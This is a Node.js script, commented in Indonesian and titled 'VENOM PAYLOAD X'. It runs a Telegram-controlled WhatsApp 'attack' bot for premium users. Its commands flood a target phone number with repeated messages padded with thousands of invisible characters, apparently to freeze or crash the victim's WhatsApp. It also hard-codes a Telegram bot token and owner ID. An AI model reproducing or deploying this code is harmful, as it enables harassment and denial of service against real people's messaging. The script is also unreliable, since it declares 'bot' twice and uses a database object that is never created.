// 🐍 VENOM PAYLOAD X - SCRIPT LENGKAP & SESUAI FITUR
// 1. IMPOR LIBRARY
const { Telegraf } = require('telegraf');
const {
    makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    isJidValid
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const { JSONFile } = require('lowdb/node');
const readline = require('readline');
const chalk = require('chalk');
const { Low } = require('lowdb');

// Token & ID Telegram Kamu
const BOT_TOKEN = "7738225453:AAHGTtHlmOde4WFBZgVBRwNZSOZb7GJ80X4";
const OWNER_ID = "6320809772";
 
// Inisialisasi Bot Telegram
const bot = new Telegraf(BOT_TOKEN);
 
// URL Database Token GitHub
const GITHUB_TOKEN_LIST_URL = "https://github.com/heriekoprasetyo56-boop/HeriTezzRorw-/blob/main/Database.json";

// 2. VARIABEL GLOBAL
let Seren = null;
let isWhatsAppConnected = false;
let currentCtx = null;
const startTime = Date.now();
const isBlacklisted = (ctx) => ctx?.from && db.data.blacklist.includes(ctx.from.id.toString());
const isAdmin = (ctx) => ctx?.from && db.data.admin.includes(ctx.from.id.toString());
const isOwner = (ctx) => ctx?.from && db.data.owner.includes(ctx.from.id.toString());

const formatWaJid = (number) => {
    if (!number) return null;
    let jid = number.replace(/[^0-9]/g, '');
    jid = jid.startsWith('0') ? `62${jid.slice(1)}` : jid;
    const fullJid = `${jid}@s.whatsapp.net`;
    return isJidValid(fullJid) ? fullJid : null;
};

const formatTeleId = (id) => id.toString();

// 5. FUNGSI SLEEP
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// 6. FUNGSI BACA INPUT TERMINAL
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});
const question = (text) => new Promise((resolve) => rl.question(text, resolve));

// 7. FUNGSI EKSEKUSI SERANGAN
async function execIosInvis(sock, target) {
    console.log(chalk.cyan(`🔫 Eksekusi iOS Invisible ke ${target}`));
    await sock.sendMessage(target, {
        extendedTextMessage: {
            text: "\u200E",
            title: "\u200E".repeat(1500),
            description: "\u200E".repeat(2500),
            previewType: "NONE"
        }
    });
    return Promise.resolve();
}

async function execXBlank(sock, target) {
    console.log(chalk.cyan(`🔫 Eksekusi XBlank ke ${target}`));
    await sock.sendMessage(target, {
        extendedTextMessage: {
            text: "\u200E",
            title: "\u200E".repeat(2000),
            description: "\u200E".repeat(3000),
            previewType: "NONE"
        }
    });
    return Promise.resolve();
}

async function execDelayInvis(sock, target) {
    console.log(chalk.cyan(`🔫 Eksekusi DelayInvis ke ${target}`));
    await sock.sendMessage(target, {
        extendedTextMessage: {
            text: "\u200E",
            title: "\u200E".repeat(1200),
            description: "\u200E".repeat(1800),
            previewType: "NONE"
        }
    });
    return Promise.resolve();
}

async function execXDelay(sock, target) {
    console.log(chalk.cyan(`🔫 Eksekusi XDelay ke ${target}`));
    await sock.sendMessage(target, {
        extendedTextMessage: {
            text: "\u200E",
            title: "\u200E".repeat(1000),
            description: "\u200E".repeat(1500),
            previewType: "NONE"
        }
    });
    return Promise.resolve();
}

// 8. FUNGSI PEMANGGIL SERANGAN
async function callInvisibleV2(sock, target) {
    console.log(chalk.magenta(`🚀 Memanggil serangan InvisibleV2 ke ${target}`));
    for (let i = 0; i < 30; i++) {
        await execIosInvis(sock, target);
        await sleep(200);
    }
    console.log(chalk.green(`✅ Serangan InvisibleV2 selesai`));
    return "selesai";
}

async function callXBlank(sock, target) {
    console.log(chalk.magenta(`🚀 Memanggil serangan XBlank ke ${target}`));
    for (let i = 0; i < 35; i++) {
        await execXBlank(sock, target);
        await sleep(150);
    }
    console.log(chalk.green(`✅ Serangan XBlank selesai`));
    return "selesai";
}

async function callDelayInvis(sock, target) {
    console.log(chalk.magenta(`🚀 Memanggil serangan DelayInvis ke ${target}`));
    for (let i = 0; i < 28; i++) {
        await execDelayInvis(sock, target);
        await sleep(180);
    }
    console.log(chalk.green(`✅ Serangan DelayInvis selesai`));
    return "selesai";
}

async function callXDelay(sock, target) {
    console.log(chalk.magenta(`🚀 Memanggil serangan XDelay ke ${target}`));
    for (let i = 0; i < 25; i++) {
        await execXDelay(sock, target);
        await sleep(200);
    }
    console.log(chalk.green(`✅ Serangan XDelay selesai`));
    return "selesai";
}

// 9. FUNGSI MANAJEMEN
async function addPremium(userId) {
    const idStr = formatTeleId(userId);
    if (db.data.premium.includes(idStr)) return "❌ Sudah jadi premium";
    db.data.premium.push(idStr);
    await db.write();
    return `✅ Berhasil tambah premium: ${userId}`;
}

async function addAdmin(userId) {
    const idStr = formatTeleId(userId);
    if (db.data.admin.includes(idStr)) return "❌ Sudah jadi admin";
    db.data.admin.push(idStr);
    await db.write();
    return `✅ Berhasil tambah admin: ${userId}`;
}

async function addOwner(userId) {
    const idStr = formatTeleId(userId);
    if (db.data.owner.includes(idStr)) return "❌ Sudah jadi owner";
    db.data.owner.push(idStr);
    await db.write();
    return `✅ Berhasil tambah owner: ${userId}`;
}

async function addPairing() {
    try {
        const nomor = await question(chalk.yellow("📱 Masukkan nomor WA (format: 628xxx): "));
        const code = await Seren.requestPairingCode(nomor);
        console.log(chalk.blue(`💡 Kode pairing yang muncul di HP kamu: ${code}`));
        const inputKode = await question(chalk.yellow("✍️ Masukkan kode dari HP kamu: "));
        await Seren.submitPairingCode(inputKode);
        return "✅ Berhasil pairing!";
    } catch (error) {
        console.error(chalk.red(`❌ Gagal pairing: ${error.message}`));
        return "❌ Gagal pairing!";
    }
}

// 10. FUNGSI KONEKSI WA (HANYA PAIRING CODE)
const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    Seren = makeWASocket({
        version,
        printQRInTerminal: false,
        pairingCode: true,
        logger: pino({ level: 'silent' }),
        auth: state,
        browser: ['Chrome (Linux)', '100.0', '']
    });

    Seren.ev.on('creds.update', saveCreds);
    Seren.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, isNewLogin } = update;

        if (isNewLogin || !connection) {
            console.log(chalk.cyan("\n🔄 Mulai proses pairing..."));
            const hasil = await addPairing();
            console.log(chalk.green(hasil));
        }

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.green("\n✅ WA BERHUBUNGAN! Semua fitur siap digunakan"));
            if (currentCtx) currentCtx.reply("✅ WA terhubung — siap jalankan perintah!");
        }

        if (connection === 'close') {
            const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(chalk.red("\n❌ WA terputus!"), reconnect ? "Menghubungkan ulang..." : "Silakan jalankan ulang script");
            if (reconnect) startSesi();
            isWhatsAppConnected = false;
        }
    });
};
startSesi();

// 11. SETUP BOT TELEGRAM
const bot = new Telegraf(BOT_TOKEN);

// Middleware
const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) return ctx.reply("❌ WA belum terhubung.");
    return next();
};

const checkPremium = (ctx, next) => {
    if (!db.data.premium.includes(formatTeleId(ctx.from.id))) return ctx.reply("❌ Khusus Premium.");
    return next();
};

const checkAdmin = (ctx, next) => {
    if (!isAdmin(ctx)) return ctx.reply("❌ Khusus Admin.");
    return next();
};

const checkOwner = (ctx, next) => {
    if (!isOwner(ctx)) return ctx.reply("❌ Khusus Owner.");
    return next();
};

// State untuk target
bot.use((ctx, next) => {
    ctx.session = ctx.session || {};
    return next();
});

// COMMAND /start & /menu
bot.command(['start', 'menu'], async (ctx) => {
    currentCtx = ctx;
    if (isBlacklisted(ctx)) return ctx.reply("⛔ Blacklisted.");

    const menu = `[FITUR SERANGAN]
 /invisiblev2 [62xxx] - Serangan Invisible
 /xdelay [62xxx]       - Serangan Delay Ringan
 /delayinvis [62xxx]   - Serangan Delay Sedang
 /xblank [62xxx]       - Serangan Blank Berat
 [FITUR MANAJEMEN]
 /addprem [ID]   - Tambah Premium
 /addadmin [ID]  - Tambah Admin
 /addowner [ID]  - Tambah Owner
 /addpairing     - Pairing WA Baru`;

    await ctx.reply(menu);
});

// COMMAND SERANGAN (SEMUA SESUAI MENU)
bot.command('invisiblev2', checkWhatsAppConnection, checkPremium, async (ctx) => {
    const target = ctx.message.text.split(' ')[1];
    if (!target) return ctx.reply("⚠️ Format yang benar: /invisiblev2 628xxx");
    
    const targetJid = formatWaJid(target);
    if (!targetJid) return ctx.reply("❌ Nomor WA tidak valid!");
    
    try {
        await callInvisibleV2(Seren, targetJid);
        ctx.reply(`✅ Serangan InvisibleV2 berhasil dijalankan ke ${target}`);
    } catch (error) {
        console.error(chalk.red(`❌ Error: ${error.message}`));
        ctx.reply("❌ Gagal menjalankan serangan!");
    }
});

bot.command('xdelay', checkWhatsAppConnection, checkPremium, async (ctx) => {
    const target = ctx.message.text.split(' ')[1];
    if (!target) return ctx.reply("⚠️ Format yang benar: /xdelay 628xxx");
    
    const targetJid = formatWaJid(target);
    if (!targetJid) return ctx.reply("❌ Nomor WA tidak valid!");
    
    try {
        await callXDelay(Seren, targetJid);
        ctx.reply(`✅ Serangan XDelay berhasil dijalankan ke ${target}`);
    } catch (error) {
        console.error(chalk.red(`❌ Error: ${error.message}`));
        ctx.reply("❌ Gagal menjalankan serangan!");
    }
});

bot.command('delayinvis', checkWhatsAppConnection, checkPremium, async (ctx) => {
    const target = ctx.message.text.split(' ')[1];
    if (!target) return ctx.reply("⚠️ Format yang benar: /delayinvis 628xxx");
    
    const targetJid = formatWaJid(target);
    if (!targetJid) return ctx.reply("❌ Nomor WA tidak valid!");
    
    try {
        await callDelayInvis(Seren, targetJid);
        ctx.reply(`✅ Serangan DelayInvis berhasil dijalankan ke ${target}`);
    } catch (error) {
        console.error(chalk.red(`❌ Error: ${error.message}`));
        ctx.reply("❌ Gagal menjalankan serangan!");
    }
});

bot.command('xblank', checkWhatsAppConnection, checkPremium, async (ctx) => {
    const target = ctx.message.text.split(' ')[1];
    if (!target) return ctx.reply("⚠️ Format yang benar: /xblank 628xxx");
    
    const targetJid = formatWaJid(target);
    if (!targetJid) return ctx.reply("❌ Nomor WA tidak valid!");
    
    try {
        await callXBlank(Seren, targetJid);
        ctx.reply(`✅ Serangan XBlank berhasil dijalankan ke ${target}`);
    } catch (error) {
        console.error(chalk.red(`❌ Error: ${error.message}`));
        ctx.reply("❌ Gagal menjalankan serangan!");
    }
});

/// COMMAND MANAJEMEN (SEMUA SESUAI MENU & LENGKAP)
bot.command('addprem', checkOwner, async (ctx) => {
    const userId = ctx.message.text.split(' ')[1];
    if (!userId) return ctx.reply("⚠️ Format yang benar: /addprem [ID]");
    const result = await addPremium(userId);
    ctx.reply(result);
});

bot.command('addadmin', checkOwner, async (ctx) => {
    const userId = ctx.message.text.split(' ')[1];
    if (!userId) return ctx.reply("⚠️ Format yang benar: /addadmin [ID]");
    const result = await addAdmin(userId);
    ctx.reply(result);
});

bot.command('addowner', checkOwner, async (ctx) => {
    const userId = ctx.message.text.split(' ')[1];
    if (!userId) return ctx.reply("⚠️ Format yang benar: /addowner [ID]");
    const result = await addOwner(userId);
    ctx.reply(result);
});

bot.command('addpairing', checkOwner, async (ctx) => {
    try {
        ctx.reply("🔄 Mulai proses pairing baru — cek terminal VPS kamu untuk melanjutkan!");
        const hasil = await addPairing();
        ctx.reply(hasil);
    } catch (error) {
        console.error(chalk.red(`❌ Error pairing: ${error.message}`));
        ctx.reply("❌ Gagal melakukan pairing baru!");
    }
});

// JALANKAN BOT TELEGRAM
bot.launch();
console.log(chalk.blue(`🤖 BOT TELEGRAM BERJALAN! Silakan buka Telegram dan ketik /start`));
console.log(chalk.yellow(`👨‍💻 DEVELOPER: HeriKeyzora`)); // Tambahin baris in

// HANDLE ERROR DAN PENUTUPAN SCRIPT
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
